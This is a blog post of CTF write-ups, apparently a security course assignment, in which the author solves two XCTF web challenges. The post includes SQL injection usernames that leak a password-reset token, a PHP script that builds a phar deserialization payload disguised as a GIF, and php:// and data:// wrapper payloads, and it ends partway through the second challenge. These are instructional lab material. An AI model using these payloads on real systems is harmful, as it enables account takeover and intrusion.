<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>攻防世界Web题目WP（二） | Capcomin's Space</title><meta name="keywords" content="CTF,Web,课程作业,网络安全,攻防世界"><meta name="author" content="Capcomin"><meta name="copyright" content="Capcomin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文是《网络安全课程设计》的一项任务 (CTF Part 2)   下文的“难度”指攻防世界的题目星级，最高为10星   easylaravel （难度：10&#x2F;10）首先使用dirsearch进行目录扫描：  发现了robots.txt，但为空；然后尝试打开&#x2F;upload目录，需要登录，但前端注释里给了github地址，得到了网站源码。 尝试注册一个普通用户，但并没有upload功能，于是开始寻找">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界Web题目WP（二）">
<meta property="og:url" content="https://zxy.link/posts/16b653c4/index.html">
<meta property="og:site_name" content="Capcomin&#39;s Space">
<meta property="og:description" content="本文是《网络安全课程设计》的一项任务 (CTF Part 2)   下文的“难度”指攻防世界的题目星级，最高为10星   easylaravel （难度：10&#x2F;10）首先使用dirsearch进行目录扫描：  发现了robots.txt，但为空；然后尝试打开&#x2F;upload目录，需要登录，但前端注释里给了github地址，得到了网站源码。 尝试注册一个普通用户，但并没有upload功能，于是开始寻找">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zxy.link/img/cyberlock.jpg">
<meta property="article:published_time" content="2022-01-02T16:00:00.000Z">
<meta property="article:modified_time" content="2022-01-24T12:07:51.044Z">
<meta property="article:author" content="Capcomin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="课程作业">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="攻防世界">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zxy.link/img/cyberlock.jpg"><link rel="shortcut icon" href="/img/soundcloud.png"><link rel="canonical" href="https://zxy.link/posts/16b653c4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '攻防世界Web题目WP（二）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-01-24 20:07:51'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Capcomin's Space" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://avatars.githubusercontent.com/u/75996100?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cyber-security-designed-for-bfsi-s-cloud-first-future.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Capcomin's Space</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界Web题目WP（二）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-02T16:00:00.000Z" title="发表于 2022-01-03 00:00:00">2022-01-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-24T12:07:51.044Z" title="更新于 2022-01-24 20:07:51">2022-01-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界Web题目WP（二）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/16b653c4/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note info flat"><p>本文是《网络安全课程设计》的一项任务 (CTF Part 2)</p>
</div>

<div class="note warning flat"><p>下文的“难度”指攻防世界的题目星级，最高为10星</p>
</div>

<h2 id="easylaravel-（难度：10-10）"><a href="#easylaravel-（难度：10-10）" class="headerlink" title="easylaravel （难度：10/10）"></a>easylaravel （难度：10/10）</h2><p>首先使用dirsearch进行目录扫描：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/c910e9283ae98e6e7de2d24b88854afa.png"></p>
<p>发现了robots.txt，但为空；然后尝试打开/upload目录，需要登录，但前端注释里给了github地址，得到了网站源码。</p>
<p>尝试注册一个普通用户，但并没有upload功能，于是开始寻找admin账号的获取方式。在登录界面发现重置密码功能，只需要输入邮箱地址：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/0999070b490cd11841a35a2265172dda.png"></p>
<p>于是开始寻找管理员邮箱。直接在源码里检索“admin@”，在<code>/easy_laravel/app/Http/Middleware/AdminMiddleware.php</code>文件里发现了管理员邮箱：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;auth-&gt;user()-&gt;email !== <span class="string">&#x27;admin@qvq.im&#x27;</span>) &#123;  </span><br><span class="line">           <span class="keyword">return</span> redirect(route(<span class="string">&#x27;error&#x27;</span>));  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure>

<p>另外在源码中发现，只有使用管理员邮箱时才能访问/flag页面：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlag</span>(<span class="params"></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$flag </span>= file_get_contents(<span class="string">&#x27;/th1s1s_F14g_2333333&#x27;</span>);  </span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;auth.flag&#x27;</span>)-&gt;with(<span class="string">&#x27;flag&#x27;</span>, <span class="variable">$flag</span>);  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>

<p>非管理员账号只能访问note页面。下面我们开始尝试获取管理员账户权限。但本题没有直接获取管理员密码的方式，只能尝试别的方法。观察下列代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">up</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        Schema::create(<span class="string">&#x27;password_resets&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint <span class="variable">$table</span></span>) </span>&#123;  </span><br><span class="line">            <span class="variable">$table</span>-&gt;string(<span class="string">&#x27;email&#x27;</span>)-&gt;index();  </span><br><span class="line">            <span class="variable">$table</span>-&gt;string(<span class="string">&#x27;token&#x27;</span>)-&gt;index();  </span><br><span class="line">            <span class="variable">$table</span>-&gt;timestamp(<span class="string">&#x27;created_at&#x27;</span>)-&gt;nullable();  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>

<p>或许我们可以拿到<a href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#64;&#113;&#x76;&#113;&#x2e;&#x69;&#109;">&#97;&#100;&#x6d;&#x69;&#x6e;&#64;&#113;&#x76;&#113;&#x2e;&#x69;&#109;</a>的token，这样我们就可以重置admin密码。我们可以通过SQL注入来获取token。</p>
<p>注册一个用户名为<code>admin&#39; order by 6 #</code>的账号，查看note发现出现错误，如果注册一个用户名为<code>admin&#39; order by 5 #</code>的账号则不会：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/c8e7970420e2b89896749dcf2041b517.png"></p>
<p>说明存在SQL注入。于是构造一个用户名为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,(select token from password_resets limit 1,2),3,4,5#  </span></span><br></pre></td></tr></table></figure>

<p>的账号，登录后便得到了admin的token。然后访问<code>http://111.200.241.244:59568/password/reset/token</code>，修改密码即可登录admin后台，发现有文件上传页面。此时如果点击flag页面会返回“no flag”。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/f9d37a2b54b82c55c5c090ae1d7cb7a9.png"></p>
<p>在源码中检索与flag有关的代码文件，找到FlagController.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlag</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$flag </span>= file_get_contents(<span class="string">&#x27;/th1s1s_F14g_2333333&#x27;</span>);  </span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;auth.flag&#x27;</span>)-&gt;with(<span class="string">&#x27;flag&#x27;</span>, <span class="variable">$flag</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>但显然<code>showFlag()</code>函数未被调用。在<code>check()</code>函数中发现<code>file_exists()</code>函数，因此本题应该是使用<code>phar://</code>协议进行反序列化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">files</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$files </span>= array_except(Storage::allFiles(<span class="string">&#x27;public&#x27;</span>), [<span class="string">&#x27;0&#x27;</span>]);  </span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;files&#x27;</span>)-&gt;with(<span class="string">&#x27;files&#x27;</span>, <span class="variable">$files</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">Request <span class="variable">$request</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$path </span>= <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;path&#x27;</span>, <span class="keyword">$this</span>-&gt;path);  </span><br><span class="line">        <span class="variable">$filename </span>= <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;filename&#x27;</span>, <span class="literal">null</span>);  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$filename</span>)&#123;  </span><br><span class="line">            <span class="keyword">if</span>(!file_exists(<span class="variable">$path </span>. <span class="variable">$filename</span>))&#123;  </span><br><span class="line">                Flash::error(<span class="string">&#x27;磁盘文件已删除，刷新文件列表&#x27;</span>);  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                Flash::success(<span class="string">&#x27;文件有效&#x27;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> redirect(route(<span class="string">&#x27;files&#x27;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>因此可以利用反序列化删除模板缓存。下面寻找一个魔术方法（例如<code>__destruct()</code>函数）来激活反序列化漏洞。TemporaryFileByteStream.php文件中 <code>Swift_ByteStream_TemporaryFileByteStream</code>类符合我们的要求，因为<code>check()</code>函数会使用<code>file_exists</code>函数，并且<code>path</code>和<code>filename</code>可控，因此可以用来构造phar文件进行反序列化攻击。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$filePath </span>= tempnam(sys_get_temp_dir(), <span class="string">&#x27;FileByteStream&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filePath </span>=== <span class="literal">false</span>) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">&#x27;Failed to retrieve temporary file name.&#x27;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">parent</span>::__construct(<span class="variable">$filePath</span>, <span class="literal">true</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getContent</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$content </span>= file_get_contents(<span class="keyword">$this</span>-&gt;getPath())) === <span class="literal">false</span>) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">&#x27;Failed to get temporary file content.&#x27;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;  </span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>接下来生成phar文件。在本地运行以下php文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">    <span class="keyword">include</span>(autoload.php<span class="string">&#x27;);    </span></span><br><span class="line"><span class="string">    $val1 = serialize(new Swift_ByteStream_TemporaryFileByteStream());    </span></span><br><span class="line"><span class="string">    var_dump(unserialize($val1));    </span></span><br><span class="line"><span class="string">    var_dump($val1);    </span></span><br><span class="line"><span class="string">    $val1 = preg_replace(&quot;/\/private\/var\/folders\/v4\/wl2fggss4x76q3_m97bjsw780000gn\/T\/FileByteStream[a-zA-Z0-9]&#123;6&#125;/&quot;,&quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $val1);    </span></span><br><span class="line"><span class="string">    var_dump($val1);    </span></span><br><span class="line"><span class="string">    $val1 = str_replace(&#x27;</span>s:<span class="number">77</span><span class="string">&#x27;, &#x27;</span>s:<span class="number">90</span><span class="string">&#x27;, $val1);    </span></span><br><span class="line"><span class="string">    $val2 = unserialize($val1);    </span></span><br><span class="line"><span class="string">    $testphar = new Phar(&#x27;</span>./<span class="number">0000001</span>.phar<span class="string">&#x27;, 0);    </span></span><br><span class="line"><span class="string">    $testphar-&gt;startBuffering();    </span></span><br><span class="line"><span class="string">    $testphar-&gt;setStub(&#x27;</span>GIF89a<span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>(); ?&gt;&#x27;);    </span></span><br><span class="line"><span class="comment">    $testphar-&gt;setMetadata($val2);    </span></span><br><span class="line"><span class="comment">    $testphar-&gt;addFromString(&#x27;fanxueliehua.txt&#x27;,&#x27;text&#x27;);    </span></span><br><span class="line"><span class="comment">    $testphar-&gt;stopBuffering();    </span></span><br><span class="line"><span class="comment">    rename(&#x27;0000001.phar&#x27;, &#x27;0000001.gif&#x27;)    </span></span><br><span class="line"><span class="comment">?&gt;    </span></span><br></pre></td></tr></table></figure>

<p>便可构成POP链，得到phar文件。</p>
<p>上传后即可得到flag。</p>
<h2 id="nizhuansiwei-（难度：7-10）"><a href="#nizhuansiwei-（难度：7-10）" class="headerlink" title="nizhuansiwei （难度：7/10）"></a>nizhuansiwei （难度：7/10）</h2><div class="note info flat"><p>注：因为攻防世界上本题容器创建有问题，所以本题将在buuctf上继续答题。</p>
</div>

<p>打开后首先是代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="variable">$text </span>= <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];  </span><br><span class="line"><span class="variable">$file </span>= <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password </span>= <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;  </span><br><span class="line">        <span class="keyword">exit</span>();   </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php  </span></span><br><span class="line">        <span class="variable">$password </span>= unserialize(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>这段代码主要是要我们传入一个text，然后让text参数不为空，并且<code>file_get_contents</code>函数读出<code>$text</code>变量内容为“welcome to the zjctf”。第二个if语句是说<code>$file</code>中不能包含关键字flag，满足要求后反序列化<code>$password</code>变量，最后输出<code>$password</code>。</p>
<p>首先考虑第一个if语句，使用伪协议data://text并且对字符串welcome to the zjctf进行base64编码。Payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=  </span></span><br></pre></td></tr></table></figure>

<p>然后考虑第二个if语句。要满足<code>$file</code>不含有“flag”字符串，注释提示我们可能要用 useless.php。因此还是用php伪协议，先读取useless.php的代码。Payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=useless.php  </span></span><br></pre></td></tr></table></figure>

<p>得到一串base64字符，解码得到useless.php内容：</p>
